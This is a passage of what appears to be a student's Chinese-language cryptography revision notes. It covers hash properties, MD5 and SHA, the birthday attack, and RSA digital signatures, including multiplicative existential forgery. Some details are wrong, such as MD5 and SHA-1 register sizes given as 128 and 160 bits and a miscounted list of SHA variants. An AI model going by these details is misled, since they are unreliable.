class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mn>84</mn></mrow><annotation encoding="application/x-tex">c=84</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">4</span></span></span></span>。</p><p>解密:</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>84</mn><mo>∗</mo><mn>4</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>89</mn><mo>=</mo><mn>69</mn></mrow><annotation encoding="application/x-tex">84*4\ mod\ 89=69</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">8</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">9</span></span></span></span>。</p><p>得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>01011</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(01011)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，解密完成。</p><p>手算了例子1，现在做这个例题2简直爽翻了！</p><h2 id="hash"><a class="markdownIt-Anchor" href="#hash"></a> Hash</h2><p>看了一看2008年得卷子，没有Hash函数得计算题。我决定对接下去得Hash和签名都注重理解，对它们具体得实现原理不做详解。</p><p>我们之前学习得古典密码、流密码、公钥密码都是有加密有解密，一个信息在加密后还能够恢复到原样，这有什么用呢？其目的就在于隐藏这个信息而只让某些人（有密钥）的人阅读，这做到了信息的保密。</p><p>但是如何保证这个信息有没有被篡改呢？这可以用到Hash函数。Hash的目的不是为了解密，从目的上讲，它不应该被解密，它应该是一个单向函数。</p><p>以下为Hash函数的应用，建议背下来，非常有可能出个多项选择题。</p><ol><li>消息认证</li><li>软件完整性</li><li>数字签名</li><li>一次性口令</li><li>时间戳</li><li>证书</li></ol><p>哈希分为强无碰撞哈希和若不碰撞哈希。</p><p>它们的前三个性质一致</p><ol><li>压缩</li><li>容易计算</li><li>单向</li></ol><p>然后它们最后一个性质分别为强无碰撞性和弱无碰撞性。</p><p>弱碰撞性指的是，给定<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，找到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>2</mn></msub><mi mathvariant="normal">≠</mi><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">m_2\neq m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>h</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h(m_1)=h(m_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，在计算上不可行。</p><p>也就是说如果一个函数要被称为hash函数，它起码要满足，给定一个明文，你在给定时间内无法找到另一个明文，使它们值相等。</p><p>那强碰撞性是不是指根本不可能存在两个两个明文使得他们的hash值相等呢？不是。</p><p>这里我们思考hash的第一个性质，压缩，任何长度的明文经过hash之后都会产生固定长度的内容，比如128位。</p><p>那就如生日重复这个问题，找366个人来，至少有两个人的生日是重复的，对于hash来说也是一样的，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>128</mn></msup></mrow><annotation encoding="application/x-tex">2^{128}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span></span>个明文的hash值中至少有两个的值是相等的，所以hash函数的第一个性质就决定了它一定会存在碰撞。</p><p>那这个强碰撞是什么意思呢？是在规定时间里，你找不到两个明文，它们hash值相等。我们可以看到这比弱碰撞性的更牛，因为它允许你随便去找，而不是去找给定明文的碰撞。</p><p>对于一个强碰撞哈希，你在给定时间里甚至都找不到两个哈希值相等的明文，更不用说找到某个特定明文的碰撞了。</p><h3 id="安全哈希函数的构造"><a class="markdownIt-Anchor" href="#安全哈希函数的构造"></a> 安全哈希函数的构造</h3><p><img src="https://upyun.wuuconix.link/image-20211018203434861.png" alt="hash exam1" /></p><p>这里例子满足hash函数的定义嘛？压缩了，容易计算并且是单向的，因为你无法根据一个余数知道它到底是哪个数的余数。但是不满足弱碰撞性，我们很容易就能获得一个同余的数。</p><p><img src="https://upyun.wuuconix.link/image-20211018203711197.png" alt="hash exam 2" /></p><p>该例子同样满足压缩，易算，单向。但是还是不满足弱碰撞行。只要将明文换顺序，还是同样的hash值。</p><h3 id="md5特性"><a class="markdownIt-Anchor" href="#md5特性"></a> MD5特性</h3><ol><li>直接构造法: 不依赖任何密码系统和假设条件</li><li>算法简洁</li><li>计算速度快</li><li>特别适合32位计算机软件实现</li><li>倾向于使用低端结构</li></ol><h3 id="md5需要记忆的一些东西"><a class="markdownIt-Anchor" href="#md5需要记忆的一些东西"></a> MD5需要记忆的一些东西</h3><p>我也不知道MD5会考察的多么深，这里简单的分析一下。</p><ol><li><p>消息的长度模512如果不是448，那么就首先需要进行填充，填充的方法十分简单，就是往最后添加<code>10000..</code>。至于有多少个零，就只要填到总的长度模512为448就行了。</p></li><li><p>为什么不直接填到512的整数倍呢？因为还要加64位的明文长度。什么意思呢？也就是还要加64位的二进制数，这个二进制数代表了明文的长度。所以加上这个明文长度的64位后，最后的长度就是512位的整数倍了，这也就是一开始为填充到448的原因。</p></li><li><p>然后初始化4个128位的寄存器A，B，C，D。</p></li><li><p>消息由512位的数据块进行处理4轮，每轮是有16轮的迭代。</p><p><img src="https://upyun.wuuconix.link/image-20211018210135121.png" alt="md5 过程" /></p></li></ol><h3 id="md5分析"><a class="markdownIt-Anchor" href="#md5分析"></a> MD5分析</h3><p><img src="https://upyun.wuuconix.link/image-20211018210428644.png" alt="md5" /></p><p>经过这么多年，md5的碰撞已经被发现了，所以它不是一个强碰撞哈希了。但是它仍然是一个弱碰撞哈希。因为现在还没有人能够在可以接受的时间内找到给定明文的碰撞。</p><p>更不可能根据一个哈希值通过运算得到它的原文，因为这是哈希的性质<code>单向</code>。现在的哈希破解都是把一些常见明文的哈希值存入数据库然后搜索得到的，不是<code>解密</code>。未来MD5可能会找到快速找到给定明文的哈希碰撞的方法，但是绝对不可能出现解密，这违背它做为哈希函数的底线。</p><h3 id="shasecure-hash-algorithm"><a class="markdownIt-Anchor" href="#shasecure-hash-algorithm"></a> SHA(Secure Hash Algorithm)</h3><p><img src="https://upyun.wuuconix.link/image-20211018211631348.png" alt="sha" /></p><p>有5种SHA，分别为SHA-1,SHA-2,SHA-224,SHA-256,SHA-384,SHA-512。</p><p>课件上介绍的SHA-1感觉和MD5极为类似。貌似只是把寄存器个数设置成了5个，然后每个寄存器的位数变成了160位。</p><p>仍然是4轮，但是每轮的迭代次数从16次变成了20次。</p><p>感觉就是个强化版MD5，企图通过加强属性来让碰撞变得困难。</p><p>但是这对于王小云来说没有什么用，这对她来说应该就像做同种题型一样简单。</p><p><img src="https://upyun.wuuconix.link/image-20211018212004742.png" alt="SHA-1" /></p><p><img src="https://upyun.wuuconix.link/image-20211018212058860.png" alt="SHA-1" /></p><p><img src="https://upyun.wuuconix.link/image-20211018212430390.png" alt="SHA 比较" /></p><p>我们可以看到，SHA-256,SHA-224,SHA-512,SHA-384还没有找到一组碰撞，说明这四个SHA在目前还属于强碰撞哈希，非常牛皮。</p><h3 id="生日攻击"><a class="markdownIt-Anchor" href="#生日攻击"></a> 生日攻击</h3><p>生日攻击的目标是将一个让一条真消息和假消息的哈希值相同，从而传递假消息。</p><p>我们假设两条消息的哈希值不同，这个概率很高，但是这个概率经过多次次方后肯定会下降。</p><h2 id="数字签名"><a class="markdownIt-Anchor" href="#数字签名"></a> 数字签名</h2><p>一段信息的传输在安全性上有三个目标，第一个是加密，我们可以利用之前的加密算法让信息在信道中加密，从而让中间人不知道内容。第二个是完整，我们用hash实现了这个目标。第三个目标是认证，就是通信的双方得知道对方得身份，确保自己是在和正确的人对话。而接下去讲的数字签名可以做到这一点。</p><p>数字签名有以下应用</p><ol><li><p>身份认证</p></li><li><p>数据完整性</p></li><li><p>不可否认性</p></li><li><p>匿名性</p><blockquote><p>这个匿名性 我还没明白是什么意思。</p></blockquote></li></ol><p>一个合格的数字签名应该有以下要求</p><ol><li>签名者事后不能抵赖自己的签名</li><li>任何其他人不能伪造签名</li><li>数字签名可由第三方认证，从而能够解决通信双方的争议</li><li>签名的产生必须使用发方独有的一些信息以防伪造和否认</li><li>签名的产生应比较容易</li><li>签名的识别和验证应比较容易</li><li>对已知的数字签名构造一新的信息或对已知信息构造一假冒的签名在计算上都是不可行的</li></ol><h3 id="rsa签名签名"><a class="markdownIt-Anchor" href="#rsa签名签名"></a> RSA签名——签名</h3><p>签名，和它的名字一样，应该是一个人独特的。所以如果你要对某个信息进行签名的话，你需要首先产生出一些只有你知道的东西。</p><p>由于是RSA签名，你便选定了RSA公钥(e,n)和私钥(d,p,q)。</p><p>我们可以看到这里的公钥和私钥和RSA密码中的一模一样。也同样是将公钥公开，私钥保留。</p><p>但是它们的用法发生了调转。在RSA公钥密码中，私钥是用来解密的，公钥是用来加密的，但是在签名中，私钥是用来签名的，而别人验证的时候，用的是公钥。这也能够理解，因为签名中有一条要求，<code>数字签名可由第三方认证，从而嫩黄瓜狗解决通信双方的争议</code>。</p><p>实际的签名过程非常简单<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mo>=</mo><msup><mi>m</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s=m^d(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p><p>ok，完毕了。这个s就是你产生的签名。</p><h3 id="rsa签名验证"><a class="markdownIt-Anchor" href="#rsa签名验证"></a> RSA签名——验证</h3><p>假设武丑兄收到了wuuconix发送的信息，其中附带了签名即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>。</p><p>这个时候武丑兄要怎么验证这条信息是不是wuuconix发送的呢？</p><p>首先，武丑兄需要去下载wuuconix的公钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。用公钥来验证这个签名是否正确。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>s</mi><mi>e</mi></msup><mo>=</mo><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s^e=m(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p><p>实际上只要验证以上实际是否成立即可。</p><h3 id="签名和加密先后顺序"><a class="markdownIt-Anchor" href="#签名和加密先后顺序"></a> 签名和加密先后顺序</h3><p>这里有一个先签名再加密还是先加密再签名的问题。</p><p>最后的结论是先签名后加密。但是不是特别懂。这是一篇<a href="https://zhuanlan.zhihu.com/p/290711693">参考文章</a>。</p><p>流程如下</p><p><img src="https://upyun.wuuconix.link/image-20211019162253265.png" alt="先加密后签名" /></p><p>我们可以看到发送方即用到了自己的私钥用来签名，又用到了收件方的公钥用来加密。收件方即用到了自己的私钥用来解密，又用到了发送方的公钥进行验证。</p><p>这种非对称密码的思想在信息的传递过程中发挥得淋漓尽致。</p><h3 id="rsa签名的存在性伪造"><a class="markdownIt-Anchor" href="#rsa签名的存在性伪造"></a> RSA签名的存在性伪造</h3><ol><li><p>假设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m_1,s_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>m</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m_2,s_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是有效的签名。</p><p>那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m_1m_2,s_1s_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>也是有效的签名。</p><p>这里不是单纯的字符串连接，而是两个数的乘。因为我们已经采用RSA签名了，实际上都是指数运算，输入和输出都是一个个数。</p><p>因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>=</mo><msubsup><mi>m</mi><mn>1</mn><mi>d</mi></msubsup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_1=m_1^d(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>m</mi><mn>2</mn><mi>d</mi></msubsup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_2=m_2^d(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p>所以两个签名一乘，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>m</mi><mn>1</mn><mi>d</mi></msubsup><msubsup><mi>m</mi><mn>2</mn><mi>d</mi></msubsup><mtext> </mtext><mo>=</mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mtext> 